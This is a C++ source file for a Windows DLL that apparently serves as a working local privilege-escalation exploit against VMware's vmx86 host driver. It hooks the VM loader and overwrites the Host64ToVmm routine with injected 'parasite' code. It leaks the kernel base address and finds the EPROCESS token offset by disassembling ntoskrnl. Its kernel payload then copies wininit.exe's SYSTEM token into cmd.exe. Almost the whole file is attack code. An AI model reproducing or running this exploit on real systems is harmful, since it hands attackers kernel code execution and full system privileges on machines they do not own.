// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <algorithm>
#include <string>

#include <Windows.h>
#include <winternl.h>
#include <tlhelp32.h>

#include "uhde.h"
#include "hook.h"



extern "C" void parasite(void);
extern "C" void parasite_end(void);

ULONG rsp_hack_adj;
ULONG parasite_adj_addr1;
ULONG parasite_adj_addr2;

hook classVM_LOADER;

typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

#define PEPROCESS PVOID

BOOL FileExists(LPCTSTR szPath)
{
	DWORD dwAttrib = ::GetFileAttributes(szPath);
	return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

typedef void (WINAPI * RtlGetVersion_FUNC) (OSVERSIONINFOEXW *);

BOOL MGetVersion(OSVERSIONINFOEX * os)
{
	HMODULE hMod;
	RtlGetVersion_FUNC func;
	OSVERSIONINFOEXW o;
	OSVERSIONINFOEXW *osw = &o;

	hMod = ::LoadLibrary(TEXT("ntdll.dll"));
	if (hMod) 
	{
		func = (RtlGetVersion_FUNC)::GetProcAddress(hMod, "RtlGetVersion");
		if (func == 0) 
		{
			::FreeLibrary(hMod);
			return FALSE;
		}
		ZeroMemory(osw, sizeof(*osw));
		osw->dwOSVersionInfoSize = sizeof(*osw);
		func(osw);

		os->dwBuildNumber = osw->dwBuildNumber;
		os->dwMajorVersion = osw->dwMajorVersion;
		os->dwMinorVersion = osw->dwMinorVersion;
		os->dwPlatformId = osw->dwPlatformId;
	}
	else
		return FALSE;

	::FreeLibrary(hMod);

	return TRUE;
}


HANDLE get_pid_by_process_name(wchar_t *proc_name)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;

	hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap != INVALID_HANDLE_VALUE)
	{
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (::Process32First(hProcessSnap, &pe32))
		{
			do
			{
				if (!wcscmp(pe32.szExeFile, proc_name))
						return (HANDLE)(UINT_PTR)pe32.th32ProcessID;
			} while (::Process32Next(hProcessSnap, &pe32));
		}
		//else
		//	printf("Process32First failed\r\n");

	}
	//else
	//	printf("CreateToolhelp32Snapshot failed\r\n");

	return 0;
}


PVOID get_napi_va(uint8_t* map_base, uint64_t img_base, char *api_name)
{
	PVOID result = 0;

	IMAGE_DOS_HEADER* dhdr = (IMAGE_DOS_HEADER*)map_base;
	IMAGE_NT_HEADERS64* nthdr = (IMAGE_NT_HEADERS64*)(map_base + dhdr->e_lfanew);
	if (nthdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
	{
		IMAGE_EXPORT_DIRECTORY* exports = (IMAGE_EXPORT_DIRECTORY*)(map_base + nthdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
		uint32_t* AddressOfFunctions = (uint32_t*)(map_base + exports->AddressOfFunctions);
		uint32_t* AddressOfNames = (uint32_t*)(map_base + exports->AddressOfNames);
		uint16_t* AddressOfNameOrdinals = (uint16_t*)(map_base + exports->AddressOfNameOrdinals);

		for (DWORD i = 0; i < exports->NumberOfNames; i++)
		{
			if (!strcmp(api_name, ((char*)map_base + AddressOfNames[i])))
			{
				result = (PVOID)(img_base + AddressOfFunctions[AddressOfNameOrdinals[i]]);
				break;
			}

		}
	}
	return result;
}

typedef NTSTATUS(WINAPI *TNtQuerySystemInformation)(ULONG_PTR SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
TNtQuerySystemInformation _NtQuerySystemInformation;

#define SystemModuleInformation 11

PVOID leak_kernelbase()
{
	ULONG len = 0;
	PVOID result = 0;

	_NtQuerySystemInformation = (TNtQuerySystemInformation)::GetProcAddress(::GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
	if (!_NtQuerySystemInformation)
		return 0;

	_NtQuerySystemInformation(SystemModuleInformation, nullptr, 0, &len);
	RTL_PROCESS_MODULES *modules = (RTL_PROCESS_MODULES*)std::malloc(len * 2);
	if (modules)
	{
		if (_NtQuerySystemInformation(SystemModuleInformation, modules, len * 2, &len) >= 0)
		{
			for (ULONG i = 0; i < modules->NumberOfModules; i++)
			{
				std::string moduleName((PCHAR)modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName);
				std::transform(moduleName.begin(), moduleName.end(), moduleName.begin(), ::tolower);

				if (moduleName.find("ntoskrnl.exe") != std::string::npos)
				{
					result = (PVOID)modules->Modules->ImageBase;
					break;
				}

			}
		}
		std::free(modules);
	}
	return result;
}


// kernel payload stuff

typedef ULONG(NTAPI *TDbgPrint)(_In_ PCHAR Format, ...);
typedef PVOID(NTAPI *TMmGetSystemRoutineAddress)(_In_ PUNICODE_STRING SystemRoutineName);
typedef VOID(WINAPI *TRtlInitUnicodeString)(_Inout_ PUNICODE_STRING DestinationString, _In_opt_ PCWSTR SourceString);
typedef NTSTATUS(WINAPI *TPsLookupProcessByProcessId)(_In_  HANDLE    ProcessId, _Out_ PEPROCESS *Process);
typedef VOID(WINAPI *TObDereferenceObject)(_In_ PVOID Object);


class krn_pld
{
public:
	unsigned char magic_val;
	void km_payload_code(krn_pld *);
	void setup_strings(krn_pld *);
	TDbgPrint _DbgPrint;
	TPsLookupProcessByProcessId _PsLookupProcessByProcessId;
	TObDereferenceObject _ObDereferenceObject;

	TMmGetSystemRoutineAddress _MmGetSystemRoutineAddress; // initialized 1
	TRtlInitUnicodeString _RtlInitUnicodeString; // initialized 2
	
	DWORD token_offset;
	HANDLE target_pid;
	HANDLE source_pid;
	
	char msgstr[64];
	WCHAR s_DbgPrint[64];
	WCHAR s_PsLookupProcessByProcessId[64];
	WCHAR s_ObDereferenceObject[64];

};
void payload_marker_start(krn_pld *km_data)
{
	km_data->_DbgPrint(km_data->msgstr); // dummy
}
void krn_pld::km_payload_code(krn_pld *km_data)
{
	UNICODE_STRING routineName;
	km_data->_RtlInitUnicodeString(&routineName, km_data->s_DbgPrint);
	km_data->_DbgPrint = (TDbgPrint)km_data->_MmGetSystemRoutineAddress(&routineName);
	if (km_data->_DbgPrint)
	{
		for (int i = 0; i < 30; i++)
			km_data->_DbgPrint(km_data->msgstr);
	}
	

	// steal token
	km_data->_RtlInitUnicodeString(&routineName, km_data->s_PsLookupProcessByProcessId);
	km_data->_PsLookupProcessByProcessId = (TPsLookupProcessByProcessId)km_data->_MmGetSystemRoutineAddress(&routineName);

	km_data->_RtlInitUnicodeString(&routineName, km_data->s_ObDereferenceObject);
	km_data->_ObDereferenceObject = (TObDereferenceObject)km_data->_MmGetSystemRoutineAddress(&routineName);

	if (km_data->token_offset && km_data->_MmGetSystemRoutineAddress && km_data->_ObDereferenceObject)
	{
		NTSTATUS status;
		HANDLE pid_src = (HANDLE)km_data->source_pid;
		HANDLE pid_dst = (HANDLE)km_data->target_pid;
		PEPROCESS eprocess_src;
		PEPROCESS eprocess_dst;
		status = km_data->_PsLookupProcessByProcessId((HANDLE)pid_src, &eprocess_src);
		if (NT_SUCCESS(status))
		{
			status = km_data->_PsLookupProcessByProcessId((HANDLE)pid_dst, &eprocess_dst);
			if (NT_SUCCESS(status))
			{
				*(DWORD *)((PUCHAR)eprocess_dst + km_data->token_offset) = *(DWORD *)((PUCHAR)eprocess_src + km_data->token_offset);

				km_data->_ObDereferenceObject(eprocess_dst);
			}

			km_data->_ObDereferenceObject(eprocess_src);
		}
	}
}

void payload_marker_end(krn_pld *km_data)
{
	UNICODE_STRING routineName; // dummy
	km_data->magic_val = 1;// dummy
	km_data->_DbgPrint = (TDbgPrint)km_data->_MmGetSystemRoutineAddress(&routineName); // dummy
}

// setup string (usermode)
void krn_pld::setup_strings(krn_pld *km_data)
{
	strcpy_s(km_data->msgstr, 64, "KERNEL CODE EXEC!\r\n");

	
	wcscpy_s(km_data->s_ObDereferenceObject, 64, L"ObDereferenceObject");
	wcscpy_s(km_data->s_PsLookupProcessByProcessId, 64, L"PsLookupProcessByProcessId");
	wcscpy_s(km_data->s_DbgPrint, 64, L"DbgPrint");

	
	km_data->token_offset = 0;
	km_data->target_pid = 0;
	km_data->source_pid = 0;

}

DWORD locate_token_offset()
{
	WCHAR sys_dir[MAX_PATH + 16];
	WCHAR krnlpth[MAX_PATH + 16];
	DWORD token_pos = 0;
	if (::GetSystemDirectory(sys_dir, MAX_PATH))
	{
		wsprintf(krnlpth, L"%ws\\%ws", sys_dir, L"ntoskrnl.exe");
		if (FileExists(krnlpth))
		{
			HMODULE hMod = ::LoadLibraryEx(krnlpth, NULL, LOAD_LIBRARY_AS_DATAFILE | LOAD_LIBRARY_AS_IMAGE_RESOURCE);
			if (hMod)
			{
				PBYTE mod_base_addr = (PBYTE)((uintptr_t)hMod & -4);
				PVOID va_PsReferencePrimaryToken = (PVOID)get_napi_va(mod_base_addr, 0, "PsReferencePrimaryToken");

				if (va_PsReferencePrimaryToken)
				{
					PBYTE _PsReferencePrimaryToken = (PBYTE)mod_base_addr + (size_t)va_PsReferencePrimaryToken;
					ULONG len = 0;
					uhde64 hde;
					while (len < 256)
					{
						len += hde.disasm(_PsReferencePrimaryToken + len);
						if (hde.gethdes()->opcode == 0xE8)
							break;
						else if (hde.gethdes()->opcode == 0x8D)
							token_pos = token_pos > hde.gethdes()->disp.disp32 ? token_pos : hde.gethdes()->disp.disp32;
						else if (hde.gethdes()->opcode >= 0x81)
							token_pos = token_pos > hde.gethdes()->imm.imm32 ? token_pos : hde.gethdes()->imm.imm32;
					}
				}

				::FreeLibrary(hMod);
			}
		}
	}

	return token_pos;
}


DWORD susp_resm_threads(DWORD pid, bool resume0)
{
	DWORD tid = 0;
	HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (h != INVALID_HANDLE_VALUE)
	{
		THREADENTRY32 te;
		te.dwSize = sizeof(te);
		if (Thread32First(h, &te))
		{
			do
			{
				if (te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID) && te.th32OwnerProcessID == pid && te.th32ThreadID != GetCurrentThreadId())
				{


					DWORD target_tid = te.th32ThreadID;
					HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, target_tid); 


					if (hThread && hThread != INVALID_HANDLE_VALUE)
					{
						if (resume0)
							ResumeThread(hThread);
						else
							SuspendThread(hThread);

						CloseHandle(hThread);
					}
				}
				te.dwSize = sizeof(te);
			} while (Thread32Next(h, &te));
		}
		CloseHandle(h);
	}
	return tid;
}


typedef void (krn_pld::*Tpayloadfunc)(krn_pld *);

krn_pld payload_class;
typedef PVOID(*Tspec_func)(void);
Tspec_func R_hook_vm_loader;

volatile unsigned long long triggered;

PVOID hook_vm_loader(void)
{
	PVOID result = 0;
	result = R_hook_vm_loader();
	
	//if (InterlockedCompareExchange(&triggered, 1, 0))
	//	return result;
	
	//BYTE Host64ToVmm_pat[] = { 0x48, 0x81, 0xc1, 0x40, 0x01, 0x00, 0x00, 0xff, 0x34, 0x24, 0x8c, 0x4c, 0x24, 0x08, 0x48, 0x89 };
	BYTE Host64ToVmm_pat[] = { 0x48, 0x81, 0xc1, 0x40, 0x01, 0x00, 0x00, 0xff, 0x34, 0x24, 0x8c, 0x4c, 0x24, 0x08 };
	
	PBYTE Host64ToVmm = ((PBYTE)::GetModuleHandleA(0));

	while (true)  // don't care, just crash if pattern not found
	{
		if (!memcmp(Host64ToVmm, Host64ToVmm_pat, sizeof(Host64ToVmm_pat)))
			break;

		Host64ToVmm++;
	}
	
	WCHAR sys_dir[MAX_PATH + 16];
	WCHAR krnlpth[MAX_PATH + 16];
	if (::GetSystemDirectory(sys_dir, MAX_PATH))
	{
		wsprintf(krnlpth, L"%ws\\%ws", sys_dir, L"ntoskrnl.exe");
		if (FileExists(krnlpth))
		{
			HMODULE hMod = ::LoadLibraryEx(krnlpth, NULL, LOAD_LIBRARY_AS_DATAFILE | LOAD_LIBRARY_AS_IMAGE_RESOURCE);
			if (hMod)
			{
				PVOID _ExAllocatePool = get_napi_va((uint8_t*)((uintptr_t)hMod & -4), 0, "ExAllocatePool");
				PVOID _MmGetSystemRoutineAddress = get_napi_va((uint8_t*)((uintptr_t)hMod & -4), 0, "MmGetSystemRoutineAddress");
				PVOID _RtlInitUnicodeString = get_napi_va((uint8_t*)((uintptr_t)hMod & -4), 0, "RtlInitUnicodeString");

				PVOID kernel_base = leak_kernelbase();
				DWORD token_offset = locate_token_offset();

				if (*Host64ToVmm == 0x48 && kernel_base && _ExAllocatePool && _MmGetSystemRoutineAddress && _RtlInitUnicodeString && token_offset)
				{
					susp_resm_threads(GetCurrentProcessId(), 0);
					Sleep(1000);

					payload_class.setup_strings(&payload_class);
					payload_class._RtlInitUnicodeString = (TRtlInitUnicodeString)((unsigned __int64)_RtlInitUnicodeString + (PUCHAR)kernel_base);
					payload_class._MmGetSystemRoutineAddress = (TMmGetSystemRoutineAddress)((unsigned __int64)_MmGetSystemRoutineAddress + (PUCHAR)kernel_base);
					payload_class.target_pid = get_pid_by_process_name(L"cmd.exe");
					payload_class.source_pid = get_pid_by_process_name(L"wininit.exe");
					payload_class.token_offset = token_offset;
					

		
					memcpy(Host64ToVmm, parasite, (size_t)((PUCHAR)&parasite_end - (PUCHAR)&parasite));
					*(PDWORD)(Host64ToVmm + parasite_adj_addr1) = rsp_hack_adj;
					*(PDWORD)(Host64ToVmm + parasite_adj_addr2) = rsp_hack_adj;

					memcpy(Host64ToVmm + 5, &kernel_base, 8);
					memcpy(Host64ToVmm + 5 + 8, &_ExAllocatePool, 8);
					memcpy(Host64ToVmm + 5 + 8 + 8, &_MmGetSystemRoutineAddress, 8);
					Tpayloadfunc func_addr = &krn_pld::km_payload_code;

					memcpy(Host64ToVmm + 5 + 8 + 8 + 8, &func_addr, 8);
					unsigned __int64 vl = (unsigned __int64)((PUCHAR)payload_marker_end - (PUCHAR)payload_marker_start);
					memcpy((Host64ToVmm + 5) + 8 * 5, &vl, 8);

					krn_pld *hlpr_v = &payload_class;
					memcpy((Host64ToVmm + 5) + 8 * 6, &hlpr_v, 8);
					unsigned __int64 v2 = sizeof(krn_pld);
					memcpy((Host64ToVmm + 5) + 8 * 8, &v2, 8);

					susp_resm_threads(GetCurrentProcessId(), 1);
					

				}
				::FreeLibrary(hMod);
			}
		}
	}

	return result;
}

ULONG locate_return_pos()
{
	ULONG ret_pos = 0;

	WCHAR vmx_drv_path[MAX_PATH + 2];
	vmx_drv_path[MAX_PATH] = 0;
	if (!GetSystemDirectory(vmx_drv_path, MAX_PATH))
		return 0;

	wcscat_s(vmx_drv_path, MAX_PATH, L"\\Drivers\\vmx86.sys");
	if (FileExists(vmx_drv_path))
	{
		HANDLE fhandle = ::CreateFile(vmx_drv_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

		if (fhandle != INVALID_HANDLE_VALUE)
		{
			DWORD file_size = ::GetFileSize(fhandle, 0);

			if (file_size != INVALID_FILE_SIZE)
			{
				PBYTE buffer = (PBYTE)std::malloc(file_size + 32);
				if (buffer)
				{
					DWORD bytes_read = 0;
					if (::ReadFile(fhandle, buffer, file_size, &bytes_read, NULL))
					{
						ULONG len = 0;
						uhde64 hde;
						ULONG rsp_adj = 0;
						ULONG psh_nr = 0;
						bool found = 0;
						while (len < file_size)
						{
							len += hde.disasm(buffer + len);
							if (hde.gethdes()->opcode == 0xCC)
							{
								rsp_adj = 0;
								psh_nr = 0;
							}
							else if (hde.gethdes()->opcode == 0x81 && hde.gethdes()->modrm == 0xEC)
								rsp_adj = hde.gethdes()->imm.imm32;
							else if (hde.gethdes()->opcode >= 0x50 && hde.gethdes()->opcode <= 0x57)
								psh_nr++;
							else if (hde.gethdes()->opcode >= 0xB9 && hde.gethdes()->imm.imm32 == 0xC0000102)
							{
								found = 1;
								ret_pos = rsp_adj + psh_nr * 8 + 8;
								break;
							}
						}

					}
					std::free(buffer);
				}
			}

			::CloseHandle(fhandle);
		}
	}

	return ret_pos;
}



void get_return_adj_addr(PDWORD addr1, PDWORD addr2)
{
	ULONG len = 0;
	ULONG lenp = 0;
	uhde64 hde;
	size_t para_size = (size_t)((PBYTE)&parasite_end - (PBYTE)&parasite);
	while (len < para_size)
	{
		lenp = len;
		len += hde.disasm((PBYTE)parasite + len);
		if (hde.gethdes()->opcode == 0xFF && hde.gethdes()->modrm == 0xB4 && hde.gethdes()->sib == 0x24)
		{
			*addr1 = (lenp + 3);
		}
		else if (hde.gethdes()->opcode == 0x89 && hde.gethdes()->modrm == 0x84 && hde.gethdes()->sib == 0x24)
		{
			*addr2 = (lenp + 4);
			break;
		}
	}
	return;
}




BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	HMODULE hmod;
	PBYTE vm_loader_func;
	const BYTE vmloader_pat[] = { 0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x48, 0x89, 0x7C, 0x24, 0x20, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x48, 0x83, 0xEC };

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:

		::GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_PIN, (LPCTSTR)hModule, &hmod);

		rsp_hack_adj = locate_return_pos();
		get_return_adj_addr(&parasite_adj_addr1, &parasite_adj_addr2);

		if (parasite_adj_addr1 && parasite_adj_addr2 && rsp_hack_adj)
		{
			vm_loader_func = (PBYTE)::GetModuleHandleA(0);

			while (true) // don't care, just crash if pattern not found
			{
				if (!memcmp(vm_loader_func, vmloader_pat, sizeof(vmloader_pat)))
				{
					ULONG len = 0;
					ULONG lenp = 0;
					uhde64 hde;
					bool found = 0;
					while (len < 200)
					{
						lenp = len;
						len += hde.disasm(vm_loader_func + len);
						if (hde.gethdes()->opcode == 0xFF && hde.gethdes()->modrm >= 0xD0 && hde.gethdes()->modrm <= 0xD7)
						{
							found = 1;
							break;
						}
						else if (hde.gethdes()->opcode == 0xC3 || hde.gethdes()->opcode == 0xE8 || hde.gethdes()->opcode == 0xE9)
							break;
						
					}
					if (found)
						break;
				}

				vm_loader_func++;
			}


			classVM_LOADER.sethook(vm_loader_func, hook_vm_loader, (PVOID *)&R_hook_vm_loader);
		}
	

		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
